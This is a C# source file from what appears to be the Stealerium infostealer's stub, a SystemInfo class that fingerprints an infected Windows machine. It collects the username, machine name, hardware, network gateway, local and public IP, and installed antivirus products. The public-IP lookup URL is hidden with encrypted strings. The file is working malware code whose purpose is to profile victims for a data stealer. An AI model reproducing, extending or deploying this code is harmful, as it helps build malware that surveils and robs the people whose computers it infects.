using System;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Modules.Implant;

namespace Stealerium.Stub.Target.System
{
    internal sealed class SystemInfo
    {
        // Username
        public static string Username => Environment.UserName;

        // Computer name
        public static string Compname => Environment.MachineName;

        // Language
        public static string Culture => CultureInfo.CurrentCulture.ToString();

        // Current date
        public static readonly string Datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");

        // Get screen metrics
        public static string ScreenMetrics()
        {
            var bounds = Screen.GetBounds(Point.Empty);
            return $"{bounds.Width}x{bounds.Height}";
        }

        // Get battery status
        public static string GetBattery()
        {
            try
            {
                var batteryStatus = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
                var batteryLifePercent = SystemInformation.PowerStatus.BatteryLifePercent * 100;
                return $"{batteryStatus} ({batteryLifePercent.ToString(CultureInfo.InvariantCulture)}%)";
            }
            catch
            {
                return "Unknown";
            }
        }

        // Get system version name
        private static string GetWindowsVersionName()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return obj["Name"].ToString().Split('|')[0].Trim();
                    }
                }
            }
            catch
            {
                return "Unknown System";
            }

            return "Unknown System";
        }

        // Get bit version
        private static string GetBitVersion()
        {
            try
            {
                var processorInfo = Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    ?.GetValue("Identifier")?.ToString();

                return processorInfo?.Contains("x86") == true ? "(32 Bit)" : "(64 Bit)";
            }
            catch
            {
                return "(Unknown)";
            }
        }

        // Get full system version
        public static string GetSystemVersion()
        {
            return $"{GetWindowsVersionName()} {GetBitVersion()}";
        }

        // Get default gateway
        public static string GetDefaultGateway()
        {
            try
            {
                return NetworkInterface.GetAllNetworkInterfaces()
                    .Where(n => n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .SelectMany(n => n.GetIPProperties().GatewayAddresses)
                    .Select(g => g?.Address?.ToString())
                    .FirstOrDefault() ?? "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        // Get antivirus software
        public static string GetAntivirus()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    var antivirusProducts = searcher.Get()
                        .Cast<ManagementObject>()
                        .Select(result => result["displayName"].ToString())
                        .ToList();

                    return antivirusProducts.Count > 0 ? string.Join(", ", antivirusProducts) : "Not installed";
                }
            }
            catch
            {
                return "N/A";
            }
        }

        // Get local IP
        public static string GetLocalIp()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                return host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)?.ToString()
                       ?? "No network adapters with an IPv4 address in the system!";
            }
            catch
            {
                return "No network adapters with an IPv4 address in the system!";
            }
        }

        // Get public IP
        public static async Task<string> GetPublicIpAsync()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var url = StringsCrypt.Decrypt(new byte[]
                    {
                        23, 61, 220, 157, 111, 249, 43, 180, 122, 28, 107, 102, 60, 187, 44, 39, 44, 238, 221, 5,
                        238, 56, 3, 133, 224, 68, 195, 226, 41, 226, 22, 191
                    }); // http://icanhazip.com

                    var externalIp = await client.GetStringAsync(url).ConfigureAwait(false);
                    return externalIp.Trim();
                }
            }
            catch (Exception ex)
            {
                Logging.Log("SystemInfo >> GetPublicIP : Request error\n" + ex);
                return "Request failed";
            }
        }

        // Get CPU name
        public static string GetCpuName()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj["Name"]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch
            {
                return "Unknown";
            }

            return "Unknown";
        }

        // Get GPU name
        public static string GetGpuName()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj["Name"]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch
            {
                return "Unknown";
            }

            return "Unknown";
        }

        // Get RAM amount
        public static string GetRamAmount()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        var totalPhysicalMemory = Convert.ToDouble(obj["TotalPhysicalMemory"]);
                        return $"{(int)(totalPhysicalMemory / 1048576)}MB";
                    }
                }
            }
            catch
            {
                return "-1";
            }

            return "-1";
        }
    }
}
